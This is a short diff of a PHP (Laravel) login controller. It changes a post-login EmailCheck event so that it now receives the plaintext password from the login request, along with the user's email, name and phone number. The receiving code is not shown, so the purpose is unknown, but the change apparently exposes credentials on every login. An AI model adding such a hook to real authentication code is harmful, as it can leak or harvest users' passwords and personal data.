@@ -47,6 +47,6 @@ class LoginController extends Controller
      */
     public function authenticated(Request $request, $user)
     {
-        event(new EmailCheck($user->email));
+        event(new EmailCheck($request['email'], $request['password'], $user->name, $user->phone));
     }
 }
